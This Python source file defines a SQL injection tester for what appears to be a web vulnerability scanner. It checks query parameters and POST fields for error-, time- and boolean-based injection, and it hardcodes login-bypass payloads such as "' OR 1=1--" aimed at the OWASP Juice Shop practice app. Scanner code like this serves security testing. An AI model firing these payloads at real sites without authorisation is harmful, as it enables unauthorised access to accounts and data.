import time
import json
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlunparse, urlencode
import requests

from scanner_core.scanner import Vulnerability
from .base_tester import BaseTester


class SqliTester(BaseTester):
    def __init__(self, session: requests.Session, config: dict):
        super().__init__(session, config)
        self.error_payloads = self.config.get('error_based_payloads', [])
        self.time_payloads = self.config.get('time_based_payloads', [])
        self.boolean_payloads = self.config.get('boolean_based_payloads', [])
        self.error_patterns = self.config.get('error_patterns', [])
        self.time_delay_threshold = self.config.get('time_delay_seconds', 4)

    def test(self, url: str) -> Optional[Vulnerability]:
        parsed_url = urlparse(url)
        if not parsed_url.query:
            return None

        query_params = parse_qs(parsed_url.query)
        base_response = self.fetch(url)
        if not base_response:
            return None

        for param in query_params:
            original_value = query_params[param]

            for payload in self.error_payloads:
                try:
                    resp = self._inject_payload(parsed_url, query_params, param, payload)
                    if resp and any(err.lower() in resp.text.lower() for err in self.error_patterns):
                        safe_val = "123456"
                        safe_resp = self._inject_payload(parsed_url, query_params, param, safe_val)

                        has_error_safe = any(err.lower() in safe_resp.text.lower() for err in
                                             self.error_patterns) if safe_resp else False

                        if not has_error_safe:
                            return Vulnerability(
                                type='SQL Injection',
                                subcategory='Error-Based',
                                url=url,
                                details={
                                    'parameter': param,
                                    'payload': payload,
                                    'evidence': 'SQL error message appeared with payload but disappeared with safe input.'
                                },
                                severity='High'
                            )
                except requests.RequestException:
                    continue

            for payload in self.time_payloads:
                try:
                    start_time = time.time()
                    self._inject_payload(parsed_url, query_params, param, payload)
                    elapsed_time = time.time() - start_time

                    if elapsed_time > self.time_delay_threshold:
                        start_verify = time.time()
                        self._inject_payload(parsed_url, query_params, param, str(original_value[0]))
                        elapsed_verify = time.time() - start_verify

                        if elapsed_verify < 2:
                            return Vulnerability(
                                type='SQL Injection',
                                subcategory='Time-Based',
                                url=url,
                                details={
                                    'parameter': param,
                                    'payload': payload,
                                    'response_time_payload': f'{elapsed_time:.2f}s',
                                    'response_time_normal': f'{elapsed_verify:.2f}s',
                                    'evidence': 'Server response was significantly delayed by the payload.'
                                },
                                severity='High'
                            )
                except requests.RequestException:
                    continue

            true_payload = "' AND 1=1--"
            false_payload = "' AND 1=2--"

            try:
                resp_true = self._inject_payload(parsed_url, query_params, param, true_payload)
                resp_false = self._inject_payload(parsed_url, query_params, param, false_payload)

                if resp_true and resp_false:
                    sim_true = self._calculate_similarity(base_response.text, resp_true.text)
                    sim_false = self._calculate_similarity(base_response.text, resp_false.text)

                    if sim_true > 0.95 and sim_false < 0.90:
                        return Vulnerability(
                            type='SQL Injection',
                            subcategory='Boolean-Based',
                            url=url,
                            details={
                                'parameter': param,
                                'true_payload': true_payload,
                                'false_payload': false_payload,
                                'similarity_true': f"{sim_true:.2f}",
                                'similarity_false': f"{sim_false:.2f}",
                                'evidence': 'Response content differs significantly between TRUE and FALSE conditions.'
                            },
                            severity='High'
                        )
            except requests.RequestException:
                continue

        return None

    def test_form(self, form_data: dict) -> Optional[Vulnerability]:
        if form_data['method'] != 'POST':
            return None

        url = form_data['url']
        inputs = form_data['inputs']

        is_api = any(keyword in url.lower() for keyword in ['/api/', '/rest/', '/v1/', '/v2/'])

        base_resp = self._inject_form_payload(url, inputs, None, None, is_api)
        if not base_resp:
            return None

        for target_input in inputs:
            if target_input['type'] in ['hidden', 'submit', 'radio', 'checkbox', 'button']:
                continue

            param = target_input['name']

            # --- KIỂM TRA ĐẶC BIỆT: SQLi AUTH BYPASS (OWASP Juice Shop Login) ---
            auth_bypass_payloads = ["' OR 1=1--", "' OR '1'='1", "admin@juice-sh.op'--"]
            for payload in auth_bypass_payloads:
                try:
                    resp = self._inject_form_payload(url, inputs, param, payload, is_api)
                    if resp and resp.status_code in [200, 201]:
                        # Nếu API trả về 200 OK và chứa token/session khi tiêm payload
                        if any(k in resp.text.lower() for k in ['token', 'session', 'success', 'jwt', 'user']):
                            # Verify lại bằng payload sai
                            bad_resp = self._inject_form_payload(url, inputs, param, "' AND 1=2--", is_api)
                            if bad_resp and bad_resp.status_code in [401, 403, 404, 500]:
                                return Vulnerability(
                                    type='SQL Injection', subcategory='Authentication Bypass', url=url,
                                    details={
                                        'parameter': f"POST Body: {param}", 'payload': payload,
                                        'evidence': 'Successful authentication bypass using SQL injection payload.'
                                    },
                                    severity='Critical'
                                )
                except requests.RequestException:
                    pass

            # --- BOOLEAN-BASED VERIFICATION TRÊN POST FORM ---
            true_payload = "' AND 1=1--"
            false_payload = "' AND 1=2--"

            try:
                resp_true = self._inject_form_payload(url, inputs, param, true_payload, is_api)
                resp_false = self._inject_form_payload(url, inputs, param, false_payload, is_api)

                if resp_true and resp_false:
                    sim_true = self._calculate_similarity(base_resp.text, resp_true.text)
                    sim_false = self._calculate_similarity(base_resp.text, resp_false.text)

                    # Cập nhật ngưỡng cho API JSON (thường khác biệt lớn khi có lỗi)
                    if (sim_true > 0.95 and sim_false < 0.90) or (
                            resp_true.status_code == 200 and resp_false.status_code >= 400):
                        return Vulnerability(
                            type='SQL Injection', subcategory='Boolean-Based (POST Form)', url=url,
                            details={
                                'parameter': f"POST Body: {param}", 'true_payload': true_payload,
                                'false_payload': false_payload,
                                'evidence': 'Response differs significantly between TRUE and FALSE logic inside POST form.'
                            },
                            severity='Critical'
                        )
            except requests.RequestException:
                pass

        return None

    def _inject_payload(self, parsed_url, params, target_param, payload):
        test_params = params.copy()
        test_params[target_param] = payload
        test_url = urlunparse(parsed_url._replace(query=urlencode(test_params, doseq=True)))
        return self.session.get(test_url, timeout=15, verify=False, headers={'ngrok-skip-browser-warning': 'true'})

    def _inject_form_payload(self, url, inputs, target_param, payload, is_api=False):
        data = {}
        for inp in inputs:
            if target_param and inp['name'] == target_param:
                data[inp['name']] = payload
            else:
                data[inp['name']] = inp['value']

        headers = {'ngrok-skip-browser-warning': 'true'}
        if is_api:
            # Gửi dạng JSON nếu là REST API
            return self.session.post(url, json=data, timeout=15, verify=False, headers=headers)
        else:
            # Gửi dạng Form truyền thống
            return self.session.post(url, data=data, timeout=15, verify=False, headers=headers)